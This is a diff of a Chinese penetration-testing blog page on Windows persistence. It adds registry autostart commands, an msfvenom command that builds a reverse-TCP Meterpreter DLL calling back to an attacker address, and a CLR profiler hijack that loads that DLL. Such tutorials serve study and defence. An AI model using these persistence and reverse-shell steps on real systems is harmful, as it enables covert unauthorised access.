@@ -60,8 +60,9 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;3620944d&#x2F;5.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;3620944d&#x2F;6.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;3620944d&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;timorblog.cn&#x2F;posts&#x2F;3620944d&#x2F;8.png">
 <meta property="article:published_time" content="2020-03-17T02:57:03.000Z">
-<meta property="article:modified_time" content="2020-03-23T02:43:33.580Z">
+<meta property="article:modified_time" content="2020-03-23T05:48:58.158Z">
 <meta property="article:author" content="Timor">
 <meta property="article:tag" content="Timor">
 <meta property="article:tag" content="渗透测试">
@@ -171,7 +172,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">28</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">29</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -251,7 +252,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-23 10:43:33" itemprop="dateModified" datetime="2020-03-23T10:43:33+08:00">2020-03-23</time>
+                <time title="修改时间：2020-03-23 13:48:58" itemprop="dateModified" datetime="2020-03-23T13:48:58+08:00">2020-03-23</time>
               </span>
 
           
@@ -310,7 +311,18 @@
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKEY_CURRENT_USER<span class="symbol">\C</span>ontrol Panel<span class="symbol">\D</span>esktop" /v SCRNSAVE.EXE /d C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.exe</span><br></pre></td></tr></table></figure>
 <p>power shell</p>
 <figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ItemProperty -<span class="keyword">Path</span> 'HKCU:\<span class="keyword">Control</span> <span class="keyword">Panel</span>\Desktop\' -Name <span class="string">"SCRNSAVE.EXE"</span> -<span class="keyword">Value</span> <span class="string">"C:\Users\admin\Desktop\timor.exe"</span> –PassThru</span><br></pre></td></tr></table></figure>
-<h2 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h2><p>注册表些内容实现开启自启动<br>注册表路径如下<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run</code></p>
+<h2 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h2><p>注册表些内容实现开启自启动<br>注册表路径如下<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run</code><br>run 开机自启<br>runonce 之启动一次</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\H</span>KEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line"><span class="symbol">\H</span>KEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br></pre></td></tr></table></figure>
+<p>添加一个项，加入内容</p>
+<img src="/posts/3620944d/8.png" class="" title="This is an 8 image">
+<p>cmd</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\w</span>indows<span class="symbol">\c</span>urrentversion<span class="symbol">\r</span>un<span class="symbol">\ </span>/v 123 /t REG_SZ /d C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.exe</span><br></pre></td></tr></table></figure>
+<h2 id="CLR-未成功"><a href="#CLR-未成功" class="headerlink" title="CLR(未成功)"></a>CLR(未成功)</h2><p>攻击机<br>使用msf生成dll文件</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> LPORT=<span class="number">5555</span> -f dll &gt; timor.dll</span><br></pre></td></tr></table></figure>
+<p>配置msf监听<br>靶机<br>增加 COR_ENABLE_PROFILING 值为 1，COR_PROFILER 值为 CLSID，CLSID可以为任意值，但不能与其他的重复</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING <span class="number">1</span></span><br><span class="line">SETX COR_PROFILER &#123;AAAABBBB<span class="number">-1234</span><span class="number">-1234</span><span class="number">-1234</span>-AAAABBBBCCCC&#125;</span><br></pre></td></tr></table></figure>
+<p>在注册表中添加相应的键值</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID<span class="symbol">\&#123;</span>AAAABBBB-1234-1234-1234-AAAABBBBCCCC&#125;<span class="symbol">\I</span>nProcServer32" /VE /T REG_SZ /D "C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.dll" /F</span><br><span class="line">REG ADD "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID<span class="symbol">\&#123;</span>AAAABBBB-1234-1234-1234-AAAABBBBCCCC&#125;<span class="symbol">\I</span>nProcServer32" /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -401,7 +413,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shift后门"><span class="nav-number">1.</span> <span class="nav-text">shift后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#映像劫持"><span class="nav-number">2.</span> <span class="nav-text">映像劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影子用户"><span class="nav-number">3.</span> <span class="nav-text">影子用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏文件"><span class="nav-number">4.</span> <span class="nav-text">隐藏文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定时任务"><span class="nav-number">5.</span> <span class="nav-text">定时任务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#at命令"><span class="nav-number">5.1.</span> <span class="nav-text">at命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#schtasks命令"><span class="nav-number">5.2.</span> <span class="nav-text">schtasks命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#屏幕保护程序"><span class="nav-number">6.</span> <span class="nav-text">屏幕保护程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表自启动项"><span class="nav-number">7.</span> <span class="nav-text">注册表自启动项</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shift后门"><span class="nav-number">1.</span> <span class="nav-text">shift后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#映像劫持"><span class="nav-number">2.</span> <span class="nav-text">映像劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影子用户"><span class="nav-number">3.</span> <span class="nav-text">影子用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏文件"><span class="nav-number">4.</span> <span class="nav-text">隐藏文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定时任务"><span class="nav-number">5.</span> <span class="nav-text">定时任务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#at命令"><span class="nav-number">5.1.</span> <span class="nav-text">at命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#schtasks命令"><span class="nav-number">5.2.</span> <span class="nav-text">schtasks命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#屏幕保护程序"><span class="nav-number">6.</span> <span class="nav-text">屏幕保护程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表自启动项"><span class="nav-number">7.</span> <span class="nav-text">注册表自启动项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLR-未成功"><span class="nav-number">8.</span> <span class="nav-text">CLR(未成功)</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -417,7 +429,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
